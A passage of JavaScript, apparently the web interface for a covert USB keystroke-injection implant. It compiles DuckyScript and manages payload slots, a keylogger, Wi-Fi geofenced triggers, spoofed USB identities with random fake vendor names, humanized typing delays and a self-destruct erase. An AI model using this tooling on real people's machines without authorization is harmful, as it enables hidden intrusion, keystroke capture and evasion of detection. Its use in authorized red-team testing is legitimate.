				const lines = blockContent.split('\n');
				const replacedLines = lines.map(line => `${command} ${line}`);
				const replacedBlock = replacedLines.join('\n');

				payload = payload.replace(match[0], replacedBlock);
			}
			return payload;
		}

		function applyDelays(payload) {
			const lines = payload.split('\n');
			let defaultDelay = null;
			let defaultDelayJitter = 0;
			let newLines = [];

			lines.forEach(line => {
				if (line.startsWith("DEFAULT_DELAY ")) {
					defaultDelay = line.split(" ")[1];
				} else if (line.startsWith("DEFAULT_DELAY_JITTER ")) {
					defaultDelayJitter = parseInt(line.split(" ")[1]);
				} else {
					if (defaultDelay !== null && line.trim() !== '') {
						let jitter = Math.floor(Math.random() * defaultDelayJitter);
						newLines.push(line);
						newLines.push(`DELAY ${parseInt(defaultDelay) + jitter}`);
					} else {
						newLines.push(line);
					}
				}
			});

			return newLines.join('\n');
		}

		function duckyscriptToBytecodeConverter(line) {
			let splitLine = line.split(' ');
			let cmd = splitLine[0];
			let args = splitLine.slice(1);

			switch (cmd) {
				case 'IF_PRESENT':
				case 'IF_NOTPRESENT':
				case 'WAIT_FOR_PRESENT':
				case 'WAIT_FOR_NOTPRESENT':
					line = handleGeofencingCommands(cmd, args.join(' '));
					break;
				case 'VID':
				case 'PID':
					line = handleVidPidCommands(cmd, args);
					break;
				case 'VID_RANDOM':
				case 'PID_RANDOM':
					line = handleVidPidCommands(cmd, "", random = true);
					break;
				case 'MAN':
				case 'PRO':
				case 'SER':
					line = handleManProSerCommands(cmd, args);
					break;
				case 'MAN_RANDOM':
				case 'PRO_RANDOM':
				case 'SER_RANDOM':
					line = handleManProSerCommands(cmd, "", random = true);
					break;
				case 'REBOOT':
					line = `180000`;
					break;
				case 'KEYLOGGER':
					line = handleKeyloggerCommands(args);
					break;
				case 'USB':
				case 'JIGGLER':
					line = handleUsbJigglerCommands(cmd, args);
					break;
				case 'MOUSE':
					line = handleMouseCommands(args);
					break;
				case 'DEFINE':
					break;
				case 'FUNCTION':
					break;
				case 'STRINGLN':
					line = `${ceBuildPayload(args.join(' '))}010028`;
					break;
				case 'STRING':
					line = `${ceBuildPayload(args.join(' '))}`;
					break;
				case 'KEYCODE':
					line = `${args.join(' ')}`;
					break;
				case 'RANDOM_LOWERCASE_LETTER':
				case 'RANDOM_UPPERCASE_LETTER':
				case 'RANDOM_LETTER':
				case 'RANDOM_NUMBER':
				case 'RANDOM_SPECIAL':
				case 'RANDOM_CHAR':
					line = handleRandomCommands(cmd);
					break;
				case 'SELF_DESTRUCT':
				case 'SELF-DESTRUCT':
					line = handleSelfDestructCommands(args);
					break;
				case 'USB_RESET':
					logMessage(`INFO`, 'USB Reset Issued.');
					line = `1B2700`;
					break;
				case 'CAPSLOCK_DISABLE':
					line = `350000`;
					break;
				case 'DELAY':
					line = handleDelayCommands(args);
					break;
				case 'DUCKY_LANG':
					line = handleDuckyLangCommands(args);
					break;
				case 'DEFAULT_DELAY':
					line = handleDefaultDelayCommands(args);
					break;
				case 'DEFAULT_DELAY_JITTER':
					line = handleDefaultDelayJitterCommands(args);
					break;
				case 'DEFAULT_CHAR_DELAY':
					line = handleDefaultCharDelayCommands(args);
					break;
				case 'DEFAULT_CHAR_DELAY_JITTER':
					line = handleDefaultCharDelayJitterCommands(args);
					break;
				default:
					line = handleNamedKeyCombinationCommands(cmd, args);
					break;
			}
			return line;
		}

		const ceBuildPayload = (ceBuffer) => {
			return ceBuffer.split('').map(key => ceBuildPayloadPart(key)).join('');
		};

		const ceBuildPayloadPart = (key) => {
			const [mod, hid] = memoizedKeyToHidMapping(key);
			let payloadPart = '';

			if (defaultCharDelay >= 1) {
				const humanized = getHumanized(defaultCharDelay, defaultCharDelayJitter);
				logMessage('CRIT', `Default Char Delay Set. [delay]:[${defaultCharDelay}] [jitter]:[${defaultCharDelayJitter}] [result]:[${humanized}]`);
				payloadPart += `1D${toHex(humanized / 10, 4)}`;
			}

			return payloadPart + `${padHex(1)}${padHex(mod)}${padHex(hid)}`;
		};

		const getHumanized = (delay, jitter) => jitter >= 1 ? delay + Math.floor(Math.random() * jitter) : delay;

		function split_process(hexPayload) {
			const payloadMaxSize = 1008;
			const operations = Math.ceil(hexPayload.length / payloadMaxSize);
			const split_payloads = [];

			for (let i = 0; i < operations; i++) {
				const parsement = hexPayload.substr(i * payloadMaxSize, payloadMaxSize);
				const this_sof = '20' + toHex(i + 1) + toHex(operations);
				const this_eof = '30' + toHex(i + 1) + toHex(operations);
				split_payloads.push(this_sof + parsement + this_eof);
			}

			logMessage(`CRIT`, `split_process: [hexPayload]:[${hexPayload}] [split_payloads]:[${split_payloads}]`);
			return split_payloads;
		}

		let ceStatusInterval;
		const apiResponseCEStatus = (function() {
			return function(data) {
				const {
					response,
					parameters
				} = parseData(data);
				toggleClassBasedOnStatus('footerNavPayloadRun', 'buttonRunning', parameters[1], "Running");

				let payloadRunPercent = (((parameters[3]) / (parameters[2])) * 100).toFixed(0) + '%';
				document.getElementById('payloadRunPercentBar').style.width = payloadRunPercent;
				document.getElementById('payloadRunPercent').innerHTML = payloadRunPercent;

				if (parameters[1] === "Loading" || parameters[1] === "Running") {
					document.getElementById(`payloadStorage`).classList.add(`hidden`);
					document.getElementById(`payloadRun`).classList.remove(`hidden`);
					document.getElementById(`payloadStatusLight`).classList.add(`statusLightActive`);
					if (!ceStatusInterval) {
						ceStatusInterval = setInterval(() => {
							sendMessage("CEStatus");
						}, 2000);
					}
				} else if (parameters[1] === "Idle") {
					document.getElementById(`payloadStatusLight`).classList.remove(`statusLightActive`);
					document.getElementById(`payloadStorage`).classList.remove(`hidden`);
					document.getElementById(`payloadRun`).classList.add(`hidden`);
					document.getElementById('payloadRunPercentBar').style.width = "0%";
					document.getElementById('payloadRunPercent').innerHTML = "0%";
					document.getElementById(`footerNavPayloadRun`).classList.remove(`buttonRunning`);
					sendMessage("CLStatus");
					if (ceStatusInterval) {
						clearInterval(ceStatusInterval);
						ceStatusInterval = null;
					}
				}

				logMessage('CRIT', `apiResponseCEStatus: [status]:[${data}]`);
			};
		})();

		// Mode Toggles
		function apiResponseCJ(data) {
			const {
				response,
				parameters
			} = parseData(data);
			logMessage(`CRIT`, `apiResponseCJ: [data]:[${response}]`);
			output = document.getElementById('response-CJ');
			output.value = `${response}`;
		}

		// Bootscript
		function apiResponseStatusBootSlot(data) {
			const {
				response,
				parameters
			} = parseData(data);
			if (parameters.toString().charCodeAt(0) == 0o1) {
				document.getElementById(`toggle-slotSaveBoot`).classList.add(`active`);
				document.getElementById(`toggle-slotLoadBoot`).classList.add(`active`);
			} else {
				document.getElementById(`toggle-slotSaveBoot`).classList.remove(`active`);
				document.getElementById(`toggle-slotLoadBoot`).classList.remove(`active`);
			}
		}

		function payloadSetBootSlot(mode) {
			if (mode == "on") {
				sendMessage(`CTSet\tbootscript\tbootscript`);
			} else if (mode == "off") {
				sendMessage(`CTSet\tbootscript\t0`);
			}
			sendMessage(`CTList`);
		}

		function payloadSlotPair(slotValue) {
			var payloadSlotPair = `CTSet\tbootpair\t${slotValue}`;
			sendMessage(payloadSlotPair);
			sendMessage(`CTList`);
		}

		// Payload Load
		function sendFlashReadCommands(iterations, slotAddress) {
			for (let i = 0; i < iterations; i++) {
				const currentAddress = slotAddress + (i * readSize);
				const cmd = `[pL-${i+1}.${iterations}]FR${parseInt(currentAddress)}\t${readSize}`;
				logMessage(`INFO`, `Flash Read Commands: [${cmd}]`);
				sendMessage(cmd);
				sleep(50);
			}
		}

		function payloadSlotLoad(slotValue) {
			createDialog({
				id: 'payloadloading',
				title: 'Loading Payload',
				description: `Please wait...`,
				closeEnabled: true,
			});
			payloadEditorFilename = document.getElementById(`payloadEditorFilename`);
			payloadEditorFilename.innerHTML = slotValue;

			payloadSaveMenuInput = document.getElementById(`payloadSelect`);
			payloadSaveMenuInput.value = slotValue;

			splitPayload = [];
			splitPayloadCounter = 0;
			const slotElement = document.getElementById(slotValue);
			const payloadSlotBlocks = slotElement.name.toString(16);
			const payloadSlotAddress = parseInt(payloadSlotBlocks) * blockSize;
			const payloadSlotSize = parseInt(slotElement.value) * (blockSize / readSize);
			const iterations = parseInt(payloadSlotSize, 10);

			sendFlashReadCommands(iterations, payloadSlotAddress);
		}

		function loadUserPayload(splitPayload) {
			const payloadElement = document.getElementById("payload");
			let endIndex = splitPayload.length;

			for (let i = 0; i < splitPayload.length; i++) {
				if (splitPayload.charCodeAt(i) === 0 || splitPayload.charCodeAt(i) === 255 || splitPayload.charAt(i) === "") {
					endIndex = i;
					break;
				}
			}

			payloadElement.value = splitPayload.slice(0, endIndex);
			logMessage(`INFO`, `! LOADING USER PAYLOAD`);
			viewDialog('payloadloading', 'remove');
			toggleModule('payloadFileMenu', 'close');
			payloadFileMenuButton = document.getElementById(`footerNavPayloadMenu`);
			payloadFileMenuButton.classList.remove('buttonSelectedGrey');
		}

		function apiResponsePayloadLoad(data) {
			const {
				response,
				parameters
			} = parseData(data.toString());

			if (parameters.length === 1) {
				splitPayload.push(parameters[0]);
				if (splitPayloadCounter === 15) {
					splitPayload = splitPayload.join('');
					loadUserPayload(splitPayload);
				}
			} else {
				logMessage(`INFO`, `! THIS PAYLOAD SLOT IS EMPTY`);
			}

			logMessage(`DEBUG`, `loadPayloadCallback: [data]:[${response}]`);
			splitPayloadCounter += 1;
			payloadEditorSavedElement = document.getElementById('payloadEditorSaved');
			payloadEditorSavedElement.innerHTML = "Saved";

			payloadEditorFilenameValue = document.getElementById(`payloadEditorFilename`).innerHTML;
			payloadEditorBootable = document.getElementById('payloadEditorBootable');

			if (bootpair == payloadEditorFilenameValue) {
				payloadEditorBootable.innerHTML = " + bootscript";
				payloadSaveMenuBootable = document.getElementById(`ayload-runOnBoot`);
				payloadSaveMenuBootable.classList.add('buttonSelected');
			} else {
				payloadEditorBootable.innerHTML = "";
			}
		}

		// Payload Save
		function payloadSlotSave(slotValue) {
			iterations = 0;
			createDialog({
				id: 'payloadsaving',
				title: 'Saving Payload',
				description: `Please wait...`,
				closeEnabled: true,
			});

			let bootpairvalue = document.getElementById("bootscriptPair").value;
			payloadEditorSavedElement = document.getElementById('payloadEditorSaved');
			payloadEditorSavedElement.innerHTML = "Saved";
			const payloadEditor = document.getElementById('payload');
			const payloadOutput = document.getElementById('payloadoutput');

			payloadOutput.value = payloadOutput;

			const sectorSize = 4096;
			if (slotValue == "bootscript") {
				scriptcode = compileDuckyScript();
				writeSize = 1008;
			} else {
				scriptcode = [unescapeHtml(payloadEditor.value)];
				writeSize = 1024;
			}
			const payloadSlotBlocks = document.getElementById(slotValue).name;
			const payloadSlotSectors = document.getElementById(slotValue).value;
			const payloadSlotSize = payloadSlotSectors * sectorSize;
			const payloadSlotAddress = payloadSlotBlocks * sectorSize;

			let totalLength = scriptcode.reduce((accumulator, currentValue) => {
				return accumulator + currentValue.toString().length;
			}, 0);

			if (totalLength > payloadSlotSize) {
				logMessage(`INFO`, `? PAYLOAD LENGTH TOO LONG: [${totalLength} bytes of ${payloadSlotSize} bytes.`);
				return;
			}

			for (let i = 0; i < payloadSlotSectors; i++) {
				sendMessage(`FE${String(parseInt(payloadSlotBlocks) + i)}`);
			}

			iterations = Math.ceil(totalLength / writeSize);

			scriptcode.forEach(payload => {
				for (let i = 0; i < iterations; i++) {
					parsement = payload.substr(i * writeSize, writeSize);
					const alignment = Math.ceil(parsement.length / 4) * 4;
					const slotAddress = parseInt(payloadSlotAddress) + i * writeSize;
					cmd = `[pS-${i}.${iterations}]FW${slotAddress}\t${alignment}\t${parsement}`;
					if (slotValue == "bootscript") {
						cmd = `[pS-${i}.${iterations}]CEStore\tbootscript\t${parsement}`;
						//cmd = `[pS-${i}.${iterations}]FW${slotAddress}\t${alignment}\t${parsement}`;
					}
					logMessage(`CRIT`, `SAVING DATA TO ${slotValue}: [${cmd}]`)
					sendMessage(cmd);
				}
			});

			logMessage(`INFO`, `! SAVED USER PAYLOAD TO SLOT ${slotValue}`, `Payload Saved to ${slotValue}.`);

			payloadEditorFilename = document.getElementById(`payloadEditorFilename`);
			payloadEditorFilename.innerHTML = slotValue;
			payloadEditorBootable = document.getElementById('payloadEditorBootable');

			if (bootpair == slotValue) {
				payloadSlotSave("bootscript");
				payloadEditorFilename.innerHTML = bootpairvalue;
				payloadEditorBootable.innerHTML = " + bootscript";
			} else {
				payloadEditorBootable.innerHTML = "";
			}
		}

		let slotSaveTimeoutId = null;

		function apiResponsePayloadSave(data) {
			logMessage(`CRIT`, `apiResponsePayloadSave: ${typeof data}`);
			logMessage(`WARN`, `Writing Payload to Slot - ${splitPayloadCounter + 1} of ${iterations}`, `Payload Saved to Slot.`);

			if (slotSaveTimeoutId !== null) {
				clearTimeout(slotSaveTimeoutId);
			}

			slotSaveTimeoutId = setTimeout(() => {
				viewDialog('payloadsaving', 'remove');
			}, 4000);

			splitPayloadCounter += 1;

			if (splitPayloadCounter == iterations) {
				viewDialog('payloadsaving', 'remove');
				clearTimeout(slotSaveTimeoutId);
			}
		}

		// Payload Run
		function payloadRun() {
			const footerNavPayloadRun = document.getElementById("footerNavPayloadRun");
			scriptcode = compileDuckyScript();

			scriptcode.forEach(payload => {
				const command_line = `CE[${crc16}]${payload}`;
				//		const command_line = `CE${payload}`;

				if (!payload) {
					footerNavPayloadRun.classList.remove("buttonRunning");
					logMessage("INFO", "? SCRIPT SYNTAX IS INVALID");
					return;
				}

				sendMessage(command_line);
				logMessage(`CRIT`, `Sending Payload Segment: [cmd]:[${command_line}]`);
			});
			logMessage(`INFO`, `Payload Running`);
			sendMessage("CEStatus");
		}

		const validateAndLogError = (value, cmd, lengthRange, errorMsg) => {
			if (value && (value.length < lengthRange[0] || value.length > lengthRange[1])) {
				logMessage('INFO', `! ALERT: Payload Compile Failed. ${cmd} ${errorMsg}`);
				return false;
			}
			return true;
		};

		const commandConfigs = {
			"IF_PRESENT": {
				prefixSSID: "24",
				prefixBSSID: "25",
				cmdFooter: "0307"
			},
			"IF_NOTPRESENT": {
				prefixSSID: "26",
				prefixBSSID: "27",
				cmdFooter: "0307"
			},
			"WAIT_FOR_PRESENT": {
				prefixSSID: "28",
				prefixBSSID: "29",
				cmdFooter: "0407"
			},
			"WAIT_FOR_NOTPRESENT": {
				prefixSSID: "2A",
				prefixBSSID: "2B",
				cmdFooter: "0407"
			}
		};

		const commandPrefixes = {
			"VID": "0E",
			"PID": "0F",
			"MAN": "15",
			"PRO": "16",
			"SER": "17",
			"USB": "10",
			"JIGGLER": "11"
		};

		function handleGeofencingCommands(cmd, args) {
			const config = commandConfigs[cmd];
			if (!config || !args) {
				logMessage('INFO', `! ALERT: Payload Compile Failed. ${cmd} requires one of the following: SSID and BSSID.`);
				return;
			}

			const argSSID = extractArg(args, /SSID=['"]([^'"]*)['"]/);
			const argBSSID = extractArg(args, /BSSID=['"]([^'"]*)['"]/);
			const argSIGNAL = extractArg(args, /SIGNAL=['"]([^'"]*)['"]/);
			const argMINUTES = extractArg(args, /MINUTES=['"]([^'"]*)['"]/);
			const argINTERVAL = extractArg(args, /INTERVAL=['"]([^'"]*)['"]/);

			logMessage('CRIT', `geofencing: [cmd]:[${cmd}] [${args}] [ssid]:[${argSSID}] [bssid]:[${argBSSID}] [signal]:[${argSIGNAL}] [minutes]:[${argMINUTES}] [interval]:[${argINTERVAL}]`);

			if (argSSID && argBSSID) {
				logMessage('INFO', `! ALERT: Payload Compile Failed. ${cmd} does not support both SSID and BSSID.`);
				return;
			}

			if (argSSID || argBSSID) {
				const cmdPrefix = argSSID ? config.prefixSSID : config.prefixBSSID;
				const argToUse = argSSID || argBSSID;

				if (argBSSID && !validateAndLogError(argBSSID, cmd, [17, 17], `BSSID IS THE WRONG LENGTH. Example: AA:BB:CC:DD:EE:FF vs ${argBSSID}`)) return;

				let cmdData = "";
				for (let i = 0; i < argToUse.length; i++) {
					cmdData += (argToUse[i].length % 2 !== 0) ? `${cmdPrefix}${argToUse[i]}00` : `${cmdPrefix}${argToUse[i]}`;
				}

				if (!validateAndLogError(argSIGNAL, cmd, [2, 3], `SIGNAL is invalid. Must be a number between 0 and 99`)) return;
				const cmdSignal = argSIGNAL ? `${cmdPrefix}02${toHex(argSIGNAL)}` : '';

				if (!validateAndLogError(argMINUTES, cmd, [2, 3], `MINUTES is invalid. Must be a number between 0 and 60`)) return;
				const cmdMinutes = argMINUTES ? `${cmdPrefix}02${toHex(argMINUTES)}` : `${cmdPrefix}0203`;

				if (!validateAndLogError(argINTERVAL, cmd, [2, 4], `INTERVAL is invalid. Must be a number between 0 and 255`)) return;
				const cmdInterval = argINTERVAL ? `${cmdPrefix}03${toHex(argINTERVAL)}` : `${cmdPrefix}0300`;

				const cmdArguments = (cmd === "IF_PRESENT" || cmd === "IF_NOTPRESENT") ? cmdSignal : `${cmdMinutes}${cmdInterval}`;

				let payloadIntermediate = `${cmdPrefix}0106${cmdData}${cmdArguments}${cmdPrefix}${config.cmdFooter}`;
			} else {
				logMessage('INFO', `! ALERT: Payload Compile Failed. ${cmd} requires one of the following: SSID and BSSID.`);
			}
			return payloadIntermediate;
		}

		function handleVidPidCommands(cmd, args, random = false) {
			payloadIntermediate = "";
			let prefix = commandPrefixes[cmd];
			if (!prefix) {
				console.error(`Invalid command: ${cmd}`);
				return;
			}
			let arg = random ? generateRandomHex(4) : args[0].toUpperCase();
			if (/^[\da-fA-F]+$/.test(arg) && arg.length === 4) {
				payloadIntermediate += `${prefix}${arg}`;
			}
			return payloadIntermediate;
		}

		function handleManProSerCommands(cmd, args, random = false) {
			let prefix = commandPrefixes[cmd];
			if (!prefix) {
				console.error(`Invalid command: ${cmd}`);
				return;
			}
			let argValue = random ? generateRandomWords() : args[0];
			if (!argValue) {
				return;
			}
			const argHex = asciiToHex(argValue);
			let payloadParts = [`${prefix}0106`];
			for (let i = 0; i < argHex.length; i = i + 4) {
				let temp = argHex.substr(i, 4).toString(16);
				if (argHex.length % 2 !== 0) {
					payloadParts.push(`${prefix}${temp}00`);
				} else {
					if (temp.length < 4) {
						temp = temp + "00";
					}
					payloadParts.push(`${prefix}${temp}`);
				}
			}
			payloadParts.push(`${prefix}0207`);
			payloadIntermediate = payloadParts.join('');
			return payloadIntermediate;
		}

		function handleKeyloggerCommands(args) {
			payloadIntermediate = "";
			if (args[0] != undefined) {
				let mode = "02";
				if (args[1] != undefined && args[1].toUpperCase() == "HID") {
					mode = "01";
				}
				if (args[0].toUpperCase() == 'ON' || args[0] == '1') {
					payloadIntermediate += `19` + mode + `00`;
				} else if (args[0].toUpperCase() == 'OFF' || args[0] == '0') {
					payloadIntermediate += `1A0000`;
				}
			}
			return payloadIntermediate;
		}

		function handleUsbJigglerCommands(cmd, args) {
			payloadIntermediate = "";
			let prefix = commandPrefixes[cmd];
			if (!prefix) {
				console.error(`Invalid command: ${cmd}`);
				return;
			}

			switch (args[0].toUpperCase()) {
				case 'ON':
				case '1':
					payloadIntermediate += `100001`;
					break
				case 'OFF':
				case '0':
					payloadIntermediate += `100000`;
					break
				default:
					logMessage(`INFO`, `! ERROR: Invalid ${cmd} Argument. Requires ON or OFF`);
					break
			}
			return payloadIntermediate;
		}

		function handleMouseCommands(args) {
			payloadIntermediate = "";
			const command = args[0].toUpperCase();
			const direction = {
				"-1": "04",
				"1": "03",
				"0": "03"
			};

			payloadIntermediate = "";

			function toHex(value) {
				return value.toString(16).padStart(2, '0');
			}

			function updatePayload(x, y) {
				let isNegativeX = x < 0;
				let isNegativeY = y < 0;
				let limitX = isNegativeX ? 127 : 128;
				let limitY = isNegativeY ? 127 : 128;
				while (Math.abs(x) > limitX || Math.abs(y) > limitY) {
					let stepX = 0,
						stepY = 0;
					if (Math.abs(x) > limitX) {
						stepX = isNegativeX ? -limitX : limitX;
						x -= stepX;
					}
					if (Math.abs(y) > limitY) {
						stepY = isNegativeY ? -limitY : limitY;
						y -= stepY;
					}
					const prefixX = direction[Math.sign(stepX).toString()];
					const prefixY = direction[Math.sign(stepY).toString()];
					payloadIntermediate += `${prefixX} ${toHex(Math.abs(stepX))}00`;
					payloadIntermediate += `${prefixY}00${toHex(Math.abs(stepY))}`;
				}
				const prefixX = direction[Math.sign(x).toString()];
				const prefixY = direction[Math.sign(y).toString()];
				payloadIntermediate += `${prefixX}${toHex(Math.abs(x))}00`;
				payloadIntermediate += `${prefixY}00${toHex(Math.abs(y))}`;
			}

			if (command === 'MOVE') {
				let x = parseInt(args[1]);
				let y = parseInt(args[2]);
				if (!Number.isNaN(x) && !Number.isNaN(y)) {
					updatePayload(x, y);
				}
			} else if (command === 'CLICK') {
				const mouseButtonID = parseInt(args[1]);
				if (!Number.isNaN(mouseButtonID)) {
					payloadIntermediate += `05000${toHex(mouseButtonID)}`;
				}
			}
			return payloadIntermediate;
		}

		function handleSelfDestructCommands(args) {
			payloadIntermediate = "";

			if (args == "") {
				args = 1;
			}
			const payloadCommands = {
				'1': '130000',
				'2': '140000'
			};
			const messages = {
				'1': 'Full Erase',
				'2': 'Data Passthrough'
			};
			if (args in payloadCommands) {
				logMessage('INFO', `Self Destruct is running. ${messages[args]}`);
				payloadIntermediate += `${payloadCommands[args]}`;
			} else {
				logMessage('INFO', 'Self Destruct was not run due to invalid parameter.');
			}
			return payloadIntermediate;
		}

		function handleDelayCommands(args) {
			payloadIntermediate = "";
			let iDelay = parseInt(args[0]) / 10;

			if (Number.isNaN(iDelay)) {
				logMessage('INFO', `ERROR: DELAY VALUE IS NOT AN INTEGER`);
				bRunPayload = false;
				return;
			}

			while (iDelay > 65535) {
				payloadIntermediate += `1DFFFF`;
				iDelay -= 65535;
			}

			payloadIntermediate += `1D${toHex(iDelay, 4)}`;
			return payloadIntermediate;
		}

		function handleDuckyLangCommands(args) {
			const lang = args[0];
			if (keymapList.includes(lang.toUpperCase())) {
				generateKeymap(lang.toUpperCase());
				sleep(100);
			} else {
				logMessage(`INFO`, `WARNING: DUCKY_LANG is not one of ${keymapListPretty}. Defaulting to US`);
			}
		}

		function handleDefaultDelayCommands(args) {
			defaultDelay = args[0];
			logMessage(`INFO`, `DEFAULT_DELAY is set to: ${defaultDelay} ms`);
		}

		function handleDefaultDelayJitterCommands(args) {
			defaultDelayJitter = args[0];
			logMessage(`INFO`, `DEFAULT_DELAY_JITTER is set to: ${defaultDelayJitter} ms`);
		}

		function handleDefaultCharDelayCommands(args) {
			defaultCharDelay = args[0];
			logMessage(`INFO`, `DEFAULT_DELAY is set to: ${defaultCharDelay} ms`);
		}

		function handleDefaultCharDelayJitterCommands(args) {
			defaultCharDelayJitter = args[0];
			logMessage(`INFO`, `DEFAULT_DELAY_JITTER is set to: ${defaultCharDelayJitter} ms`);
		}

		function handleNamedKeyCombinationCommands(cmd, args) {
			payloadIntermediate = "";
			let iModify = 0;
			let words = cmd.split(/[-+]/).concat(args);

			while (words.length > 0) {
				if (modifiers[words[0].toUpperCase()] != undefined) {
					iModify |= modifiers[words[0].toUpperCase()];
					words = words.slice(1);
				} else {
					break;
				}
			}

			if (words.length == 0) {
				payloadIntermediate += `01${toHex(iModify)}00`;
			} else if (words.length == 1 && keyToHidMapping(words[0]) != undefined) {
				const [mod, hid] = keyToHidMapping(words[0]);
				iModify |= mod;
				payloadIntermediate += `01${toHex(iModify)}${hid}`;
			} else {
				logMessage(`INFO`, `Payload Compile Failed: Unrecognized argument (${words[0]})`);
				throw new Error(`Unrecognized argument (${words[0]})`);
			}
			return payloadIntermediate;
		}

		function generateRandomHex(length) {
			let result = "";
			const characters = '0123456789ABCDEF';
			for (let i = 0; i < length; i++) {
				result += characters[Math.floor(Math.random() * characters.length)];
			}
			return result;
		}

		function generateRandomWords() {
			const wordCount = Math.floor(Math.random() * 4) + 2;
			let randomWords = [];
			for (let i = 0; i < wordCount; i++) {
				const wordLength = Math.floor(Math.random() * 7) + 1;
				let word = '';
				for (let j = 0; j < wordLength; j++) {
					if (j === 0) {
						word += String.fromCharCode(Math.floor(Math.random() * 26) + 65);
					} else {
						word += String.fromCharCode(Math.floor(Math.random() * 26) + 97);
					}
				}
				randomWords.push(word);
			}
			const suffixes = [', Inc.', ' Ltd.', ' Pty.', ' LLC', ' Corp.', ' Co.'];
			const suffix = suffixes[Math.floor(Math.random() * suffixes.length)];
			return randomWords.join(' ') + suffix;
		}

		function handleRandomCommands(cmd) {
			payloadIntermediate = "";
			const commandToCharactersMap = {
				RANDOM_LOWERCASE_LETTER: 'abcdefghijklmnopqrstuvwxyz',
				RANDOM_UPPERCASE_LETTER: 'ABCDEFGHIJKLMNOPQRSTUVWXYZ',
				RANDOM_LETTER: 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ',
				RANDOM_NUMBER: '0123456789',
				RANDOM_SPECIAL: '!@#$%^&*()',
				RANDOM_CHAR: 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789!@#$%^&*()',
			};

			const randomCharacters = commandToCharactersMap[cmd];

			if (randomCharacters) {
				const selected = randomCharacters.charAt(Math.floor(Math.random() * randomCharacters.length));
				payloadIntermediate += `${ceBuildPayload(selected)}`;
			}
			return payloadIntermediate;
		}

		// Keylog Module
		const ELEMENT_IDS = {
			KEYLOGGER_SPACE_USED: 'keylogger-SpaceUsed',
			KEYLOGGER_SPACE_FREE: 'keylogger-SpaceFree',
			KEYLOGGER_DATA_WAITING: 'keylogger-DataWaiting',
			KEYLOGGER_OVERFLOW_COUNT: 'keylogger-OverflowCount',
			KEYLOGGER_STATUS: 'keylogger-Status',
			KEYLOGGER_CAPTURE_MODE: 'keylogger-CaptureMode',
			KEYLOGGER_LAST_REPORT_ID: 'keylogger-LastReportID',
			KEYLOGGER_NEXT_REPORT_ID: 'keylogger-NextReportID',
			FOOTER_NAV_KEYLOG_STATUS: 'footerNavKeylogStatus',
			KEYLOG_START_BUTTON: 'keylogStartButton',
			TOGGLE_KEYLOGGING_MODE: 'toggle-keyloggingMode',
			KEYLOG_STORAGE_USED_BAR: 'keylogStorageUsedBar',
			KEYLOG_STORAGE_PERCENT: 'keylogStoragePercent',
			KEYLOGGER_LIVE_LOG_STATUS: 'keylogger-LiveLogStatus',
			FOOTER_NAV_KEYLOG_LIVE_STATUS: 'footerNavKeylogLiveStatus',
			RESPONSE_CL_STOP: 'response-CLStop',
			RESPONSE_CL_READ: 'response-CLRead',
			RESPONSE_CL_START: 'response-CLStart',
		};

		previousData = '';
		let elements = {};

		for (const key in ELEMENT_IDS) {
			elements[key] = document.getElementById(ELEMENT_IDS[key]);
		}

		function convertUint8ArrayToString(data) {
			return String.fromCharCode.apply(null, new Uint8Array(data));
		}

		function splitResponseIntoParameters(response) {
			return response.split("\t");
		}

		function handleapiResponse(data, elementId, buttonClass) {
			let response = convertUint8ArrayToString(data);
			let parameters = splitResponseIntoParameters(response);
			logMessage(`CRIT`, `apiResponse: [data]:[${response}]`);
			setElementValue(elementId, response);

			const keylogValues = {
				'keylogger-SpaceUsed': data.slice(44, 52),
				'keylogger-SpaceFree': data.slice(36, 44),
				'keylogger-DataWaiting': data.slice(28, 36),
				'keylogger-OverflowCount': data.slice(20, 28),
				'keylogger-Status': data.slice(18, 20),
				'keylogger-CaptureMode': data.slice(16, 18),
				'keylogger-LastReportID': data.slice(8, 16),
				'keylogger-NextReportID': data.slice(0, 8),
			};

			toggleClassBasedOnStatus('footerNavKeylogStatus', 'buttonSelected', keylogValues['keylogger-Status'], "01");
		}

		function setElementValue(id, value) {
			if (elements[id]) {
				if (elements[id].tagName.toLowerCase() === 'input') {
					elements[id].value = value;
				} else {
					elements[id].innerHTML = value;
				}
			}
		}

		function updateKeylogStatus(keylogValues) {
			const spaceUsedDecimal = parseInt(keylogValues[ELEMENT_IDS.KEYLOGGER_SPACE_USED], 16);
			const spaceFreeDecimal = parseInt(keylogValues[ELEMENT_IDS.KEYLOGGER_SPACE_FREE], 16);
			let keylogStoragePercent = ((spaceUsedDecimal / spaceFreeDecimal) * 100).toFixed(0) + '%';
			if (keylogStoragePercent == "0%") {
				keylogStoragePercent = "0.2%";
			}

			toggleClassBasedOnStatus('footerNavKeylogStatus', 'buttonSelected', keylogValues['keylogger-Status'], "01");
			document.getElementById('keylogStartButton').innerHTML = keylogValues['keylogger-Status'] === '01' ? 'Stop' : 'Start';
			document.getElementById('keylogStorageUsedBar').style.width = keylogStoragePercent;
			document.getElementById('keylogStoragePercent').innerHTML = keylogStoragePercent;
		}

		let prevDataCLStatus = null;

		function apiResponseCLStatus(data) {
			if (data === prevDataCLStatus) {
				return;
			}
			prevDataCLStatus = data;

			let responseHexParams = data.split('09');

			if (data === previousData) {
				return;
			}
			previousData = data;

			const keylogValues = {
				'keylogger-SpaceUsed': data.slice(44, 52),
				'keylogger-SpaceFree': data.slice(36, 44),
				'keylogger-DataWaiting': data.slice(28, 36),
				'keylogger-OverflowCount': data.slice(20, 28),
				'keylogger-Status': data.slice(18, 20),
				'keylogger-CaptureMode': data.slice(16, 18),
				'keylogger-LastReportID': data.slice(8, 16),
				'keylogger-NextReportID': data.slice(0, 8),
			};

			for (const [elementId, value] of Object.entries(keylogValues)) {
				const element = document.getElementById(elementId);
				if (element) element.value = element.innerHTML = value;
			}

			const spaceUsedDecimal = parseInt(keylogValues['keylogger-SpaceUsed'], 16);
			const spaceFreeDecimal = parseInt(keylogValues['keylogger-SpaceFree'], 16);
			const keylogStoragePercent = ((spaceUsedDecimal / spaceFreeDecimal) * 100).toFixed(0) + '%';

			toggleClassBasedOnStatus('footerNavKeylogStatus', 'buttonSelected', keylogValues['keylogger-Status'], "01");
			document.getElementById('keylogStartButton').innerHTML = keylogValues['keylogger-Status'] === '01' ? 'Stop' : 'Start';
			toggleClassBasedOnStatus('keylogStatusLight', 'statusLightActive', keylogValues['keylogger-Status'], "01");
